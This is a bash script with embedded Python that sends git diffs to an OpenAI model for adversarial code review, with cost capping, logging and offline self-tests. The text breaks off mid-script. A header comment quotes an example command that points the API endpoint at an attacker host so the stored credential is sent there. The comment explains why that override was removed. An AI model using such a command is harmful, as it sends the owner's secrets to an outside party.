#!/usr/bin/env bash
# review.sh: adversarial CROSS-VENDOR code review ("lucy"). Sends a diff to an
# OpenAI model, a different vendor from the author, whose job is to BREAK the
# change. `lucy` and `review` are the same command.
#
# WHY THIS IS A FIXED SCRIPT, AND WHY IT TAKES NO ENV CONFIG.
# This script reads the owner's Proton Pass credential and makes an authenticated
# call. Two boundary rules follow, both learned the hard way on 2026-08-12:
#
#   1. The code doing that must not be agent-writable. Proposals 08/09 briefly
#      moved it to ops/review/lucy.sh, where any agent could have rewritten it.
#   2. The DESTINATION and the credential IDENTITY must not be overridable from
#      the environment. An earlier draft honoured HQ_LUCY_API, so
#      `HQ_LUCY_API=https://attacker.example lucy` shipped the credential to an
#      arbitrary host with no script edit at all: a worse hole than the one rule 1
#      closed, because it needed only an env var. LUCY_PP_* had the same shape,
#      letting a caller point retrieval at a different Proton Pass item and post
#      that secret to OpenAI.
#
# So the endpoint and the item coordinates are constants. Changing them is a
# reviewed script change, which is the point. Anything agent-evolvable gets the diff and the
# context, never the credential, the destination, or a way to choose either.
#
# Usage:
#   review.sh [--rig R] [--base BRANCH] [--branch B] [--bead ID] [--model M] [--effort E] [--diff-file F] [--full] [--dry-run] ["<what changed + DoD>"]
#   review.sh --self-test     exercise the effort fallback offline (no key, no network)
#   review.sh --self-test-response F   replay the JSON array of API responses in F, in
#                             order, through the answer check (offline, no key)
#   No --diff-file and no --rig/--branch: reviews the current branch AND its
#   uncommitted and untracked work, in the repo or worktree the caller stands in.
#   It refuses (exit 2) when HEAD is the merge-base, or when the committed diff
#   is empty in a main checkout: then there is no branch, only untracked files
#   of the checkout (hq-4npjr.27).
#   --branch B: reviews merge-base(base, B)..B from the repo's refs (the rig's
#   main repo with --rig, else the caller's repo); no working tree is read, so a
#   worker branch in .claude/worktrees reviews cleanly from anywhere (hq-40n2x).
#   --rig R without --branch: reviews the committed HEAD of R's checkout, and
#   only when the caller stands in that checkout and it is clean; otherwise it
#   refuses (exit 2). On 2026-11-05 `--rig hq` from ~/hq sent main's untracked
#   client notes to the vendor as "the change" for a worktree branch.
#   Lock and generated files (lockfiles, *.min.*, *.map, dist/, build/, graphify-out/,
#   .beads/, snapshots) are sent as one header line each, not their contents:
#   every input token is billed (the owner 2026-11-03). --full sends them whole.
#
# Effort (hq-pgbpq.5): every request carries reasoning_effort. It is xhigh when
# the reviewed rig is money, auth or data in ops/config/security-tiers.json (or
# not in it at all: unknown counts as sensitive, as it does for security watch)
# and high otherwise; --effort overrides (none sends no param). The rig is
# --rig, else the repo the diff comes from (a worktree maps to its main repo).
# If the API rejects the param, the request is retried one step down
# (max, xhigh, high, then no param) with a note on stderr, never silently.
# A corrupt tiers file fails closed to xhigh (hq-pgbpq.15).
#
# Empty answers (hq-pgbpq.15): at xhigh the model can spend the whole completion
# budget on reasoning and return empty content with HTTP 200. An empty answer or
# finish_reason length is retried once at twice the budget; if that fails too the
# script exits 5 with nothing on stdout, never a quiet empty review.
#
# Model: gpt-6.1-sol since 2026-10-08 (the owner: go with the stack-review recommendation).
# It is the successor to 5.6 Sol at half the price ($2/$10 vs $4/$20, whose promo
# ends after 2026-11-21); verified on this endpoint with a real review (hq-rvn6.3).
# History: gpt-5.6-sol per the owner ("all adversarial review on 5.6 sol"), chosen
# on evidence: all three gpt-5.6 variants were benchmarked against a diff with
# four known real defects; sol found all four plus a genuine fifth with no false
# alarms, terra found two, luna found roughly none and raised three confident
# BLOCKERs that were misreadings. gpt-5.x-pro is not a chat model and 404s here.
# OPENAI_REVIEW_MODEL is deliberately NOT consulted; --model overrides per call.
#
# Call log and cap (hq-7llgp.5): every call that reaches the API appends one JSON
# line to ops/metrics/lucy-calls.jsonl under $HQ (ts, rig, bead, base, head, model,
# effort, status, tokens, cost_usd, verdict, severity and class counts), failed
# calls too. --bead names the bead (else HQ_BEAD). Before the key is read, the
# day's logged spend (UTC) is checked against LUCY_DAILY_CAP_USD (default 5): at
# or over it the call is refused with exit 6. Raising the cap costs money only;
# the endpoint and credential stay constants. The prompt carries the single-user
# threat model: BLOCK only for money, data loss or security.
#
# Transport timeouts (hq-kptb3.3): the read timeout is 2400 s (900 s cut off two
# xhigh reviews of large diffs on 2026-11-10 with 'HTTP 0 / The read operation
# timed out'). A transport failure (timeout, reset, DNS: HTTP 0) is retried once
# at effort high (or the asked effort when that is lower), printed on stderr as
# 'retry 1 of 1 at effort high after a transport timeout'. The failed attempt gets
# its own log line, its input cost estimated from the request size (no usage comes
# back), and the cap is checked again before the retry (exit 6 when over). A
# second transport failure exits 7 with the did-not-run text.
# Exit codes: 0 reviewed with a VERDICT; 7 no VERDICT line, or a transport failure
# after the retry: the review did NOT run; 6 refused (cap, unpriced model, log
# unusable): the review did NOT run.
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
HQ="${HQ_ROOT:-$(cd "$SCRIPT_DIR/../.." && pwd)}"
die(){ echo "review: $1" >&2; exit "${2:-1}"; }

# Constants on purpose. See the boundary note above before making any of these
# configurable.
readonly PP_VAULT="Imported on 2026-07-13 at 14.56.53"
readonly PP_ITEM="Lucy Review OpenAI"
readonly PP_FIELD="Secret"
readonly API="https://api.openai.com/v1/chat/completions"
MODEL="gpt-6.1-sol"
TIERS="$HQ/ops/config/security-tiers.json"

rig=""; base=""; branch=""; bead="${HQ_BEAD:-}"; difffile=""; context=""; dry=0; effort=""; selftest=0; replayfile=""; full=0
# Every valued option needs a real operand: present, non-empty, not option-shaped.
# An empty --diff-file or a --model that swallowed --branch used to fall through
# to the working-tree path and send untracked files (hq-40n2x.2).
val(){ [ $# -ge 2 ] && [ -n "$2" ] && [[ "$2" != -* ]] || die "$1 needs a value" 2; }
while [ $# -gt 0 ]; do
  case "$1" in
    --rig) val "$@"; rig="$2"; shift;;
    --base) val "$@"; base="$2"; shift;;
    --branch) val "$@"; branch="$2"; shift;;
    --bead) val "$@"; bead="$2"; shift;;
    --model) val "$@"; MODEL="$2"; shift;;
    --effort) val "$@"; effort="$2"; shift;;
    --self-test) selftest=1;;
    --self-test-response) val "$@"; replayfile="$2"; shift;;
    --diff-file) val "$@"; difffile="$2"; shift;;
    --dry-run) dry=1;;
    --full) full=1;;
    --*) die "unknown arg: $1" 2;;
    *) context="$1";;
  esac; shift
done
# --rig is a plain rig name ("hq" is the hq repo itself), never a path
if [ -n "$rig" ]; then
  [[ "$rig" =~ ^[A-Za-z0-9][A-Za-z0-9._-]*$ ]] && [ "$rig" != . ] && [ "$rig" != .. ] \
    || die "--rig must be a plain rig name, got: $rig" 2
fi

# The request and its effort fallback, run below with the key, or offline by --self-test.
IFS= read -r -d '' PY <<'PY'
import json, math, os, sys, urllib.error, urllib.request

SYS = ("You are a hostile, senior adversarial code reviewer from a DIFFERENT vendor than the "
       "author. Your job is to BREAK this change, not praise it. Hunt real defects: correctness "
       "bugs, security holes (injection, authz, secret leakage, SSRF, path traversal), race "
       "conditions, data-consistency issues, unhandled failure modes, resource leaks, "
       "off-by-one/edge cases, and hardcoded values that should be config.\n\n"
       "THREAT MODEL. This code runs on a single-user box: one trusted operator and the agents "
       "acting for him, not a hostile multi-user production server. Do not ask for hardening "
       "against other local users, a malicious operator, or an attacker who already has a shell "
       "or the operator's credentials. Hostile input is still real where it enters from outside: "
       "public sites, API functions, webhooks, checkout, fetched web content, emails, uploaded "
       "files.\n\n"
       "Start EACH finding with one header line in exactly this form: 'N. SEVERITY | CLASS | title', "
       "where SEVERITY is BLOCKER, MAJOR or MINOR and CLASS is one of money, data-loss, security, "
       "correctness, robustness, hardening, other. Then give the exact input or scenario that triggers it, "
       "why it breaks, and the concrete fix. BLOCKER is ONLY for class money (a wrong amount, a "
       "lost or double charge), data-loss (data destroyed, corrupted or leaked, or state that diverges permanently between tabs, clients or replicas) or security (a "
       "hole reachable under the threat model above), and only when you can name a specific "
       "reproducing input/scenario, no vague 'could be an issue'. Every other real defect is "
       "MAJOR or MINOR. Skip style/nits. If the diff is fine, say so plainly. End with one line: "
       "VERDICT: SHIP | REVISE | BLOCK, plus a 2-sentence rationale. BLOCK only with at least one "
       "BLOCKER; REVISE for MAJOR defects; SHIP when only MINOR notes remain. Be terse and concrete.")

diff = open(os.environ["DIFF_FILE"], encoding="utf-8", errors="replace").read() if os.environ.get("DIFF_FILE") else ""
ctx = os.environ.get("CTX") or "(none given)"
def chain(effort):
    """Efforts to try in order: the asked one, then one step down, then no param."""
    ladder = ["max", "xhigh", "high"]
    out = (ladder[ladder.index(effort):] if effort in ladder else [effort]) + [None]
    return [e for i, e in enumerate(out) if e not in out[:i] and e != "none"]

def rejects_effort(code, detail):
    """A 400 that names reasoning_effort: the model or endpoint does not take that value."""
    if code != 400:
        return False
    try:
        err = json.loads(detail).get("error") or {}
    except ValueError:
        err = {}
    return err.get("param") == "reasoning_effort" or "reasoning_effort" in detail

class Transport(Exception):
    """The request never got an HTTP answer (timeout, reset, DNS): send returned code 0."""

def ask(send, payload, effort):
    """send(payload) -> (code, dict_or_text). Returns (effort_used, response dict)."""
    c = chain(effort)
    for i, e in enumerate(c):
        body = dict(payload)
        if e:
            body["reasoning_effort"] = e
        code, d = send(body)
        if code == 200:
            return e, d
        if code == 0:
            raise Transport(str(d)[:300])
        if e and rejects_effort(code, d):
            nxt = c[i + 1] if i + 1 < len(c) else None
            print("review: the API rejected reasoning_effort=%s, retrying %s" %
                  (e, "at " + nxt if nxt else "with no effort param"), file=sys.stderr)
            continue
        print("review: request failed: HTTP %s\n%s" % (code, str(d)[:500]), file=sys.stderr)
        raise SystemExit(4)
    raise SystemExit(4)

def answer(d):
    """The review text of a 200 response, or None when there is no usable review: no
    choices, empty content, or a cutoff at the token budget (finish_reason length)."""
    try:
        ch = d["choices"][0]
        text = ch["message"].get("content") or ""
    except (KeyError, IndexError, TypeError, AttributeError):
        return None
    if ch.get("finish_reason") == "length" or not text.strip():
        return None
    return text

def review(send, payload, effort):
    """(effort_used, response, text). One retry at twice the budget, then exit 5."""
    used, d = ask(send, payload, effort)
    text = answer(d)
    if text is None:
        bigger = dict(payload, max_completion_tokens=2 * payload["max_completion_tokens"])
        print("review: the model returned no usable review (%s), retrying once with "
              "max_completion_tokens=%d" % (why(d), bigger["max_completion_tokens"]), file=sys.stderr)
        used, d = ask(send, bigger, used or "none")
        text = answer(d)
    if text is None:
        print("review: no usable review (%s); the review did NOT run, do not treat it "
              "as a pass" % why(d), file=sys.stderr)
        raise SystemExit(5)
    return used, d, text

def why(d):
    try:
        ch = d["choices"][0]
    except (KeyError, IndexError, TypeError):
        return "no choices in the response"
    if ch.get("finish_reason") == "length":
        return "finish_reason length: the token budget ran out"
    return "empty content"

# Call log and daily cap (hq-7llgp.5). Every call that reaches the API appends one
# JSON line to LOG_FILE, failed ones too, because a failed call is still billed.
PRICES = {"gpt-6.1-sol": (2.0, 10.0), "gpt-5.6-sol": (4.0, 20.0)}  # USD per 1M input, output tokens
SPENT = {"prompt_tokens": 0, "completion_tokens": 0, "reasoning_tokens": 0, "requests": 0}

def counted(send):
    """Wrap send so every 200 response adds its usage to SPENT. A transport failure
    returns no usage, so its input is estimated at 4 bytes per token: the cap must
    count an attempt the vendor may still bill."""
    def wrapped(body):
        code, d = send(body)
        SPENT["requests"] += 1
        if code == 0:
            SPENT["prompt_tokens"] += len(json.dumps(body)) // 4
            SPENT["estimated"] = True
        u = d.get("usage") if code == 200 and isinstance(d, dict) else None
        if isinstance(u, dict):
            SPENT["prompt_tokens"] += int(u.get("prompt_tokens") or 0)
            SPENT["completion_tokens"] += int(u.get("completion_tokens") or 0)
            SPENT["reasoning_tokens"] += int((u.get("completion_tokens_details") or {}).get("reasoning_tokens") or 0)
        return code, d
    return wrapped

def rate(model):
    """USD per 1M (input, output) for model: LUCY_MODEL_PRICE ('in/out') wins, else
    PRICES; None when unpriced, and the bash side refuses an unpriced paid call."""
    raw = os.environ.get("LUCY_MODEL_PRICE")
    if raw:
        i, o = raw.split("/")
        return float(i), float(o)
    return PRICES.get(model)

def cost(model, prompt, completion):
    """(usd, priced). Unpriced only happens on the offline replay path."""
    r = rate(model) or max(PRICES.values())
    return round((prompt * r[0] + completion * r[1]) / 1e6, 6), rate(model) is not None

CLASSES = "money|data-loss|security|correctness|robustness|hardening|other"
HEADER = None

def findings(text):
    """(verdict, severity counts, class counts) parsed from the review text. Only a
    finding's header line counts ('1. **MAJOR | robustness - title**', or the
    'SEVERITY: MAJOR, CLASS: x' form), never a severity word in its prose."""
    import re
    global HEADER
    HEADER = HEADER or re.compile(
        r"^\s*(?:[-*]\s+)?(?:\d+[.)]\s*)?[*_#\s]*(?:SEVERITY[*_:\s]*)?(BLOCKER|MAJOR|MINOR)\b"
        r"[*_\s]*(?:[|,:]\s*[*_]*\s*(?:CLASS[*_:\s]*)?(%s)\b)?" % CLASSES, re.I)
    v = re.findall(r"VERDICT\W*(SHIP|REVISE|BLOCK)\b", text or "")
    sev = {"BLOCKER": 0, "MAJOR": 0, "MINOR": 0}
    cls = {}
    for line in (text or "").splitlines():
        m = HEADER.match(line)
        if not m or "VERDICT" in line:
            continue
        sev[m.group(1).upper()] += 1
        if m.group(2):
            cls[m.group(2).lower()] = cls.get(m.group(2).lower(), 0) + 1
    return (v[-1] if v else None), sev, cls

def has_verdict(text):
    """A review with no VERDICT line is not a review: the caller must not read exit 0 as a pass."""
    if findings(text)[0] is None:
        print("review: the answer has no VERDICT line; treat this review as NOT run", file=sys.stderr)
        return False
    return True

def log_call(status, text=None, effort=None):
    path = os.environ.get("LOG_FILE")
    if not path:
        return
    model = os.environ.get("MODEL") or "m"
    usd, priced = cost(model, SPENT["prompt_tokens"], SPENT["completion_tokens"])
    verdict, sev, cls = findings(text)
    row = {"ts": __import__("datetime").datetime.now(__import__("datetime").timezone.utc).isoformat(timespec="seconds"),
           "rig": os.environ.get("RIG") or None, "bead": os.environ.get("BEAD") or None,
           "base": os.environ.get("BASE") or None, "head": os.environ.get("HEAD_SHA") or None,
           "model": model, "effort": effort, "status": status, "requests": SPENT["requests"],
           "prompt_tokens": SPENT["prompt_tokens"], "completion_tokens": SPENT["completion_tokens"],
           "reasoning_tokens": SPENT["reasoning_tokens"], "cost_usd": usd, "priced": priced,
           "usage_estimated": bool(SPENT.get("estimated")),
           "diff_bytes": int(os.environ.get("DIFF_BYTES") or 0), "verdict": verdict,
           "severity": sev, "classes": cls}
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "a", encoding="utf-8") as f:
            f.write(json.dumps(row, separators=(",", ":")) + "\n")
    except OSError as e:
        print("review: could NOT write the call log %s: %s; this call's cost is not counted "
              "toward the cap" % (path, e), file=sys.stderr)

def spent_today(path):
    """USD logged today (UTC) in the call log. A missing log is zero; a malformed
    line counts as nothing; an existing log that cannot be read raises (fail closed)."""
    import datetime
    day = datetime.datetime.now(datetime.timezone.utc).date().isoformat()
    total = 0.0
    if not os.path.exists(path):
        return total
    with open(path, encoding="utf-8", errors="replace") as f:
        for line in f:
            try:
                r = json.loads(line)
                if str(r.get("ts", "")).startswith(day):
                    c = float(r.get("cost_usd") or 0)
                    if math.isfinite(c) and c >= 0:  # NaN, Infinity or a negative must not shrink the day's total
                        total += c
            except (ValueError, TypeError, AttributeError):
                pass
    return total

READ_TIMEOUT = 2400  # seconds; 900 cut off xhigh reviews of large diffs (hq-kptb3.3)

def retry_effort(effort):
    """The transport retry runs at high, or at the asked effort when that is lower."""
    return "high" if effort in ("max", "xhigh") else effort

def over_cap():
    """(over, spent) for today's logged spend against CAP_USD; no CAP_USD means no cap
    (offline replay). An unreadable log or a non-finite sum counts as over (fail closed)."""
    cap = os.environ.get("CAP_USD")
    if not cap:
        return False, 0.0
    try:
        spent = spent_today(os.environ.get("LOG_FILE") or "")
    except OSError:
        return True, float("nan")
    return (not math.isfinite(spent)) or spent >= float(cap), spent

def attempt(send, payload, effort):
    """One review() with one log line on every exit path except a transport failure,
    which run() logs itself so it can retry."""
    try:
        used, d, text = review(counted(send), payload, effort)
    except Transport:
        raise
    except SystemExit as e:
        log_call("failed-exit-%s" % e.code, effort=effort)
        raise
    except BaseException as e:  # Ctrl-C or a crash mid-retry: usage so far is still billed
        log_call("failed-%s" % type(e).__name__, effort=effort)
        raise
    log_call("ok", text, used or "default")
    return used, d, text

def run(send, payload, effort):
    """attempt(), retried once at effort high after a transport failure (hq-kptb3.3)."""
    try:
        return attempt(send, payload, effort)
    except Transport as t:
        log_call("transport-failed", effort=effort)
        first = t
    for k in SPENT:
        SPENT[k] = False if k == "estimated" else 0
    again = retry_effort(effort)
    print("review: request failed: HTTP 0 / %s" % first, file=sys.stderr)
    over, spent = over_cap()
    if over:
        print("review: refused the retry: lucy spent %s USD today (UTC), at or over the daily cap "
              "of %s USD; the review did NOT run" % (spent, os.environ.get("CAP_USD")), file=sys.stderr)
        raise SystemExit(6)
    print("review: retry 1 of 1 at effort %s after a transport timeout" % (again or "default"), file=sys.stderr)
    try:
        return attempt(send, payload, again)
    except Transport as t:
        log_call("transport-failed", effort=again)
        print("review: request failed again: HTTP 0 / %s; lucy did NOT run, the review did NOT run, "
              "do not treat it as a pass" % t, file=sys.stderr)
        raise SystemExit(7)

def make_send(url, key, timeout):
    """send(body) -> (code, dict_or_text) against url; code 0 when no HTTP answer came."""
    def send(body):
        req = urllib.request.Request(url, data=json.dumps(body).encode(), headers={
            "Authorization": "Bearer " + key, "Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status, json.load(r)
        except urllib.error.HTTPError as e:
            return e.code, (e.read() or b"").decode("utf-8", "replace")
        except Exception as e:
            return 0, str(e)
    return send

if os.environ.get("CAP_CHECK"):
    try:
        r = rate(os.environ["MODEL"])
    except ValueError:
        print("LUCY_MODEL_PRICE must be 'input/output' USD per 1M tokens", file=sys.stderr)
        raise SystemExit(2)
    if r is None:
        print("no price for model %s: add it to PRICES in review.sh, or set "
              "LUCY_MODEL_PRICE='input/output' USD per 1M tokens" % os.environ["MODEL"], file=sys.stderr)
        raise SystemExit(3)
    try:
        spent = spent_today(os.environ["LOG_FILE"])
    except OSError as e:
        print("cannot read the call log: %s" % e, file=sys.stderr)
        raise SystemExit(4)
    if not math.isfinite(spent):  # finite lines can still sum to inf (two 1e308 lines)
        print("the day's logged spend is not a finite number; fix %s" % os.environ["LOG_FILE"], file=sys.stderr)
        raise SystemExit(4)
    print("%.4f" % spent)
    raise SystemExit(0)

if os.environ.get("REPLAY"):
    responses = json.load(open(os.environ["REPLAY"]))
    def replay(body):
        r = responses.pop(0) if len(responses) > 1 else responses[0]
        print("review-replay: sent effort=%s" % body.get("reasoning_effort"), file=sys.stderr)
        if isinstance(r, dict) and "transport_error" in r:  # a simulated timeout: no HTTP answer
            return 0, r["transport_error"]
        return 200, r
    _, _, text = run(replay, {"model": "m", "max_completion_tokens": 16000},
                     os.environ.get("REPLAY_EFFORT") or "xhigh")
    print(text)
    raise SystemExit(0 if has_verdict(text) else 7)

if os.environ.get("SELF_TEST"):
    def stub(rejected, seen):
        def send(body):
            seen.append(body.get("reasoning_effort"))
            if body.get("reasoning_effort") in rejected:
                return 400, json.dumps({"error": {"message": "Unsupported value: 'reasoning_effort'",
                                                  "param": "reasoning_effort"}})
            return 200, {"ok": True}
        return send
    cases = [("xhigh", set(), ["xhigh"], "xhigh"),
             ("high", set(), ["high"], "high"),
             ("xhigh", {"xhigh"}, ["xhigh", "high"], "high"),
             ("xhigh", {"xhigh", "high"}, ["xhigh", "high", None], None),
             ("none", set(), [None], None),
             ("max", {"max"}, ["max", "xhigh"], "xhigh"),
             ("low", {"low"}, ["low", None], None)]
    bad = 0
    for effort, rejected, want_seen, want_used in cases:
        seen = []
        used, _ = ask(stub(rejected, seen), {"model": "m"}, effort)
        okay = seen == want_seen and used == want_used
        bad |= not okay
        print("%s  effort=%s rejected=%s sent=%s used=%s" %
              ("PASS" if okay else "FAIL", effort, sorted(rejected), seen, used))
    seen = []
    def other(body):
        seen.append(body.get("reasoning_effort"))
        return 400, json.dumps({"error": {"message": "bad model", "param": "model"}})
    try:
        ask(other, {"model": "m"}, "xhigh"); okay = False
    except SystemExit as e:
        okay = e.code == 4 and seen == ["xhigh"]
    bad |= not okay
    print("%s  any other 400 fails at once, no retry (sent=%s)" % ("PASS" if okay else "FAIL", seen))
    # hq-kptb3.3: the real send maps a read timeout to code 0, which ask raises as Transport.
    # A local server that answers too slowly stands in for the API (the endpoint stays fixed).
    import http.server, threading, time
    class Slow(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            time.sleep(1.5)
            try:
                self.send_response(200); self.end_headers(); self.wfile.write(b"{}")
            except OSError:
                pass
        def log_message(self, *a):
            pass
    srv = http.server.HTTPServer(("127.0.0.1", 0), Slow)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    code, msg = make_send("http://127.0.0.1:%d/" % srv.server_port, "k", 0.3)({"model": "m"})
    try:
        ask(lambda b: (code, msg), {"model": "m"}, "xhigh"); okay = False
    except Transport:
        okay = code == 0 and "timed out" in msg
    srv.shutdown()
    bad |= not okay
    print("%s  a read timeout is HTTP 0 and raises Transport (code=%s msg=%s)" % ("PASS" if okay else "FAIL", code, msg))
    okay = READ_TIMEOUT == 2400 and [retry_effort(e) for e in ("max", "xhigh", "high", "medium", None)] == \
        ["high", "high", "high", "medium", None]
    bad |= not okay
    print("%s  read timeout 2400 s; the transport retry runs at high or lower" % ("PASS" if okay else "FAIL"))
    raise SystemExit(1 if bad else 0)

send = make_send(os.environ["REVIEW_API"], os.environ["OPENAI_API_KEY"], READ_TIMEOUT)

payload = {
    "model": os.environ["MODEL"], "max_completion_tokens": 16000,
    "messages": [{"role": "system", "content": SYS},
                 {"role": "user", "content": "Context: " + ctx + "\n\nDIFF:\n" + diff}],
}
used, d, text = run(send, payload, os.environ["EFFORT"])
print(text)
u = d.get("usage", {})
print("\n(%s, effort %s, %s completion tokens, %s reasoning)" % (
      os.environ["MODEL"], used or "default", u.get("completion_tokens", "?"),
      (u.get("completion_tokens_details") or {}).get("reasoning_tokens", "?")), file=sys.stderr)
raise SystemExit(0 if has_verdict(text) else 7)
PY

if [ "$selftest" = 1 ]; then SELF_TEST=1 python3 -c "$PY"; exit $?; fi
if [ -n "$replayfile" ]; then
  [ -r "$replayfile" ] || die "unreadable --self-test-response file: $replayfile" 2
  # offline replay logs only where LUCY_REPLAY_LOG points, never to the real log
  REPLAY="$replayfile" LOG_FILE="${LUCY_REPLAY_LOG:-}" CAP_USD="${LUCY_REPLAY_CAP_USD:-}" MODEL="$MODEL" python3 -c "$PY"; exit $?
fi

if [ -n "$difffile" ]; then
  [ -f "$difffile" ] || die "no such diff file: $difffile" 2
  diff="$(cat "$difffile")"
else
  # No --rig: review the repo (or worktree) the caller stands in. It used to
  # fall back to $HQ, so a call from a rig worktree sent hq's own uncommitted
  # files (client financial notes) to the reviewer instead (2026-10-23).
  if [ "$rig" = hq ]; then repo="$HQ"
  elif [ -n "$rig" ]; then repo="$HQ/rigs/$rig"
  else repo="$(git rev-parse --show-toplevel 2>/dev/null || true)"; fi
  [ -n "$repo" ] || die "not in a git repo (use --rig or --diff-file)" 2
  git -C "$repo" rev-parse --is-inside-work-tree >/dev/null 2>&1 \
    || die "not a git repo: $repo (use --rig, --branch or --diff-file)" 2
  if [ -n "$rig" ]; then
    # The rig directory must be its own repo. A plain directory under rigs/
    # resolves to the enclosing hq repo, so its diff would be hq's (hq-40n2x.1).
    rtop="$(git -C "$repo" rev-parse --show-toplevel 2>/dev/null || true)"
    [ -n "$rtop" ] && [ "$(realpath "$rtop")" = "$(realpath "$repo")" ] \
      || die "refused: rig dir $repo is not its own repo, enclosing repo is ${rtop:-none}" 2
  fi
  def="$base"
  [ -n "$def" ] || def="$(git -C "$repo" symbolic-ref refs/remotes/origin/HEAD 2>/dev/null | sed 's#.*/##')"
  [ -n "$def" ] || def="main"
  case "$def" in -*) die "bad --base: $def" 2;; esac
  git -C "$repo" rev-parse --verify -q "$def^{commit}" >/dev/null 2>&1 || die "no such base ref in $repo: $def" 2
  if [ -n "$branch" ]; then
    # A named branch: diff its commits from the merge-base, refs only. Never the
    # working tree of $repo, which may be a different branch with untracked files.
    case "$branch" in -*) die "bad --branch: $branch" 2;; esac
    head_sha="$(git -C "$repo" rev-parse --verify -q "$branch^{commit}" 2>/dev/null)" \
      || die "no such branch or commit in $repo: $branch" 2
    mb="$(git -C "$repo" merge-base "$def" "$head_sha" 2>/dev/null)" \
      || die "no merge-base between $def and $branch in $repo" 2
    base_sha="$mb"
    [ "$mb" != "$head_sha" ] || die "empty diff: $branch has no commits past $def, nothing to review" 2
    # Attributes come from the reviewed commit, never the checkout: an untracked
    # or main-only .gitattributes with -diff would turn the branch's hunks into a
    # "Binary files" line (reproduced on git 2.43). No external or textconv driver.
    diff="$(git -C "$repo" --attr-source="$head_sha" diff --no-ext-diff --no-textconv "$mb" "$head_sha" 2>/dev/null)"
  elif [ -n "$rig" ]; then
    # --rig with no --branch: the rig's checkout is the change only when the
    # caller stands in it and it holds nothing uncommitted. Anything else would
    # send another tree's files (hq-40n2x: ~/hq's client notes for a worktree branch).
    here="$(git rev-parse --show-toplevel 2>/dev/null || true)"
    [ -n "$here" ] && [ "$(readlink -f "$here")" = "$(readlink -f "$repo")" ] \
      || die "refused: --rig $rig reviews $repo, but you stand in ${here:-no repo}; pass --branch <worker branch> (or --diff-file)" 2
    [ -z "$(git -C "$repo" status --porcelain 2>/dev/null | head -1)" ] \
      || die "refused: $repo has uncommitted or untracked files that are not the branch; pass --branch <branch> to review committed work only" 2
    head_sha="$(git -C "$repo" rev-parse --verify -q HEAD 2>/dev/null || true)"
    mb="$(git -C "$repo" merge-base "$def" HEAD 2>/dev/null || true)"
    base_sha="${mb:-$(git -C "$repo" rev-parse --verify -q "$def" 2>/dev/null || true)}"
    diff="$(git -C "$repo" diff "${mb:-$def}" HEAD 2>/dev/null)"
  else
  # "$def" without ...HEAD compares the WORKING TREE to the base, so committed
  # and uncommitted changes are both reviewed. The old form stopped at HEAD and
  # only fell back to the worktree when the branch had no commits, so a branch
  # with one commit plus live edits got the edits silently dropped.
  # Diff from the merge-base, not the base tip: once a sibling branch merges,
  # the tip carries files this branch never had, and a tip diff shows them as
  # deletions (hq-plct.4 friction, 2026-10 retro).
  mb="$(git -C "$repo" merge-base "$def" HEAD 2>/dev/null || true)"
  base_sha="${mb:-$(git -C "$repo" rev-parse --verify -q "$def" 2>/dev/null || true)}"
  head_sha="$(git -C "$repo" rev-parse --verify -q HEAD 2>/dev/null || true)"
  # Fail closed when there is no committed branch diff (hq-4npjr.27). A branch
  # under review has at least one commit past the merge-base, so HEAD at the
  # base means the caller stands on the base itself, and the loop below would
  # send that checkout's untracked files as "the change" (2026-11-05: ~/hq
  # client notes went to the vendor for five hq beads). Checked before any
  # untracked file is read and before the key or the network.
  fix="run lucy from the branch worktree, or pass --branch <branch> or --diff-file <file>"
  if [ -n "$head_sha" ] && [ "$head_sha" = "$mb" ]; then
    die "refused: HEAD of $repo is the base $def, there is no branch diff to review; $fix" 2
  fi
  gd="$(git -C "$repo" rev-parse --absolute-git-dir 2>/dev/null || true)"
  cd_="$(git -C "$repo" rev-parse --path-format=absolute --git-common-dir 2>/dev/null || true)"
  if [ -n "$gd" ] && [ "$gd" = "$cd_" ] && git -C "$repo" diff --quiet "${mb:-$def}" HEAD -- 2>/dev/null; then
    die "refused: empty committed diff from $def in the main checkout $repo; $fix" 2
  fi
  [ -n "$(git -C "$repo" status --porcelain 2>/dev/null | head -1)" ] && head_sha="${head_sha}+dirty"
  diff="$(git -C "$repo" diff "${mb:-$def}" 2>/dev/null)"
  # untracked files are invisible to git diff; add each as a synthetic diff
  # (--no-index exits 1 when files differ, which is the normal case here)
  while IFS= read -r f; do
    [ -n "$f" ] || continue
    diff="$diff
$(git -C "$repo" diff --no-index /dev/null "$repo/$f" 2>/dev/null || true)"
  done <<UNTRACKED
$(git -C "$repo" ls-files --others --exclude-standard 2>/dev/null)
UNTRACKED
  fi
fi
[ -n "${diff//[[:space:]]/}" ] || die "empty diff, nothing to review" 3

tmpdiff="$(mktemp)"
trap 'rm -f "$tmpdiff"' EXIT
# Lock and generated files cost input tokens and say nothing a reviewer can
# check: each keeps its diff header plus a note with its changed-line count.
GEN_RE='(^|/)(package-lock\.json|npm-shrinkwrap\.json|yarn\.lock|pnpm-lock\.yaml|bun\.lockb?|uv\.lock|poetry\.lock|Pipfile\.lock|Cargo\.lock|Gemfile\.lock|composer\.lock|go\.sum|flake\.lock)$|\.min\.(js|css)$|\.map$|\.snap$|(^|/)(graphify-out|dist|demo-dist|build|\.next|node_modules|coverage|\.beads)/'
omitted=0
if [ "$full" = 0 ]; then
  diff="$(printf '%s\n' "$diff" | GEN_RE="$GEN_RE" awk -v cnt="$tmpdiff" 'BEGIN { re = ENVIRON["GEN_RE"] }
    function flush(){ if (skip) { print hdr; printf "# lucy: lock or generated file, contents omitted (%d changed lines)\n", n; nskip++ } }
    /^diff --git / { flush(); p=$NF; sub(/^b\//, "", p); skip = (p ~ re); hdr=$0; n=0; if (!skip) print; next }
    skip { if (/^[+-]/ && !/^(\+\+\+|---) /) n++; next }
    { print }
    END { flush(); print nskip+0 > cnt }')"
  omitted="$(cat "$tmpdiff")"
  [ "$omitted" -gt 0 ] 2>/dev/null && echo "review: omitted $omitted lock or generated file(s); --full sends them" >&2
fi
printf '%s' "$diff" | head -c 200000 > "$tmpdiff"

# effort: --effort wins; else xhigh for a money, auth, data or unknown rig
if [ -z "$effort" ]; then
  if [ -z "$rig" ] && [ -n "${repo:-}" ]; then
    # the main repo behind a worktree: ~/hq is hq, ~/hq/rigs/<name> is <name>
